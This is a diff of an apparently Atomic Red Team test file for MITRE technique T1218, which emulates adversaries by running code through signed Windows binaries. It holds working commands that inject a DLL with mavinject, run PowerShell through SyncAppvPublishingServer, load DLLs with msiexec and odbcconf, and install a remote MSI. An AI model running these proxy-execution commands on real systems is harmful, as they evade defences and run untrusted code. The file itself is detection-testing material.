@@ -1,220 +1,179 @@
----
-attack_technique: T1218
+attack_technique:
+- T1218
 display_name: Signed Binary Proxy Execution
-
 atomic_tests:
 - name: mavinject - Inject DLL into running process
-  auto_generated_guid: c426dacf-575d-4937-8611-a148a86a5e61
   description: |
     Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
+    process_id:
+      description: PID of process receiving injection
+      type: string
+      default: "1000"
     dll_payload:
       description: DLL to inject
       type: Path
       default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
-    process_id:
-      description: PID of process receiving injection
-      type: string
-      default: 1000
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        T1218.dll must exist on disk at specified location (#{dll_payload})
-      prereq_command: |
-        if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
-
+  - description: |
+      T1218.dll must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
-
+    name: command_prompt
+    elevation_required: true
 - name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
-  auto_generated_guid: d590097e-d402-44e2-ad72-2c6aa1ce78b1
   description: |
     Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     powershell_code:
       description: PowerShell code to execute
       type: string
       default: Start-Process calc.exe
   executor:
-    name: command_prompt
     command: |
       SyncAppvPublishingServer.exe "n; #{powershell_code}"
-
+    name: command_prompt
 - name: Register-CimProvider - Execute evil dll
-  auto_generated_guid: ad2c17ed-f626-4061-b21e-b9804a6f3655
   description: |
     Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     dll_payload:
       description: DLL to execute
       type: Path
       default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        T1218-2.dll must exist on disk at specified location (#{dll_payload})
-      prereq_command: |
-        if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
-
+  - description: |
+      T1218-2.dll must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
   executor:
-    name: command_prompt
     command: |
-     C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
-
+      C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+    name: command_prompt
 - name: Msiexec.exe - Execute Local MSI file
-  auto_generated_guid: 0683e8f7-a27b-4b62-b7ab-dc7d4fed1df8
   description: |
     Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     msi_payload:
       description: MSI file to execute
       type: Path
       default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        T1218.msi must exist on disk at specified location (#{msi_payload})
-      prereq_command: |
-        if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Write-Host "You must provide your own MSI"
-
+  - description: |
+      T1218.msi must exist on disk at specified location (#{msi_payload})
+    prereq_command: |
+      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "You must provide your own MSI"
   executor:
-    name: command_prompt
     command: |
-     msiexec.exe /q /i "#{msi_payload}"
-
+      msiexec.exe /q /i "#{msi_payload}"
+    name: command_prompt
 - name: Msiexec.exe - Execute Remote MSI file
-  auto_generated_guid: bde7d2fe-d049-458d-a362-abda32a7e649
   description: |
     Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI opens notepad.exe when sucessfully executed.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     msi_payload:
       description: MSI file to execute
       type: String
       default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi
-
   executor:
-    name: command_prompt
     command: |
-     msiexec.exe /q /i "#{msi_payload}"
-
+      msiexec.exe /q /i "#{msi_payload}"
+    name: command_prompt
 - name: Msiexec.exe - Execute Arbitrary DLL
-  auto_generated_guid: 66f64bd5-7c35-4c24-953a-04ca30a0a0ec
   description: |
     Execute arbitrary DLL file stored locally. Commonly seen in application installation.
     Upon execution, a window titled "Boom!" will open that says "Locked and Loaded!". For 32 bit systems change the dll_payload argument to the Win32 folder.
     By default, if the src folder is not in place, it will download the 64 bit version.
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     dll_payload:
       description: DLL to execute
       type: Path
       default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        T1218.dll must exist on disk at specified location (#{dll_payload})
-      prereq_command: |
-        if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
-
+  - description: |
+      T1218.dll must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
   executor:
-    name: command_prompt
     command: |
-     msiexec.exe /y "#{dll_payload}"
-
+      msiexec.exe /y "#{dll_payload}"
+    name: command_prompt
 - name: Odbcconf.exe - Execute Arbitrary DLL
-  auto_generated_guid: 2430498b-06c0-4b92-a448-8ad263c388e2
   description: |
     Execute arbitrary DLL file stored locally.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     dll_payload:
       description: DLL to execute
       type: Path
       default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        T1218-2.dll must exist on disk at specified location (#{dll_payload})
-      prereq_command: |
-        if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
-
+  - description: |
+      T1218-2.dll must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
   executor:
-    name: command_prompt
     command: |
-     odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
-
+      odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+    name: command_prompt
 - name: InfDefaultInstall.exe .inf Execution
-  auto_generated_guid: 54ad7d5a-a1b5-472c-b6c4-f8090fb2daef
   description: |
     Test execution of a .inf using InfDefaultInstall.exe
 
     Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     inf_to_execute:
       description: Local location of inf file
       type: string
       default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        INF file must exist on disk at specified location (#{inf_to_execute})
-      prereq_command: |
-        if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
-
+  - description: |
+      INF file must exist on disk at specified location (#{inf_to_execute})
+    prereq_command: |
+      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
   executor:
-    name: command_prompt
-    elevation_required: false
     command: |
       InfDefaultInstall.exe #{inf_to_execute}
+    name: command_prompt
+
